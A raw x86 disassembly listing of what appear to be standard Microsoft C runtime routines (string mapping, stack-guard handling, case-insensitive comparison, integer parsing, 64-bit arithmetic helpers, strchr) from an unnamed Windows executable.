  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
